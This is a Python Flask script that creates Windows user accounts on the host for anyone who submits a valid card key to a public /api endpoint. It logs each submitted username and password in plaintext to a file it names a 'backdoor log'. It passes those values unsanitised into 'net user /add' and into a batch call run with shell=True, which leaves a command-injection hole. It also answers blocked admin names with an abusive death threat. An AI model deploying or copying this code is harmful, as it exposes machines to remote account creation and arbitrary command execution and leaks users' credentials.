import flask, json
import subprocess
from flask import request
from flask_cors import CORS
import os

server = flask.Flask(__name__)
CORS(server)

print("正在加载卡密数据库 Loding.....")
txtkey = open("key.txt")
txt_key = []
line = txtkey.readline() # 读取第一行
while line:
    txt_key.append(line.strip()) # 列表增加
    line = txtkey.readline() # 读取下一行
txtkey.close()
print("卡密数据库加载完成！")

@server.route('/api', methods=['get', 'post'])
def api():
    a = True
    key = request.values.get('key')
    name = request.values.get('name')
    pwd = request.values.get('pwd')
    if key and name and pwd:
        if name == "Administrator" or name == "在此输入管理员密码" or name == "admin":
            a = False
            resu = {"msg": "TM尼玛玩注入攻击是吧，TM死全家"}
            return json.dumps(resu, ensure_ascii=False)
        if key in txt_key and a:
            print_log = open("后门日志.txt", 'a')
            print("\n", end="", file=print_log)
            print({"用户名": name, "密码": pwd, "卡密": key}, end="", file=print_log)
            print_log.close()
            cmd = "net user /add %s %s" % (name, pwd)
            ps = subprocess.Popen(cmd)  # 执行cmd命令
            ps.wait()  # 让程序阻塞
            cmd = "useraddwork.bat %s" % name
            ps = subprocess.Popen(cmd, shell=True)  # 执行cmd命令
            ps.wait()  # 让程序阻塞
            resu = {"msg": "开户成功！"}
            return json.dumps(resu, ensure_ascii=False)
        else:
            resu = {"msg": "检验失败，请认真核对卡密"}
            return json.dumps(resu, ensure_ascii=False)
    else:
        resu = {"msg": "请填写完整"}
        return json.dumps(resu, ensure_ascii=False)

if __name__ == '__main__':
    server.run(port=12300, host='0.0.0.0')
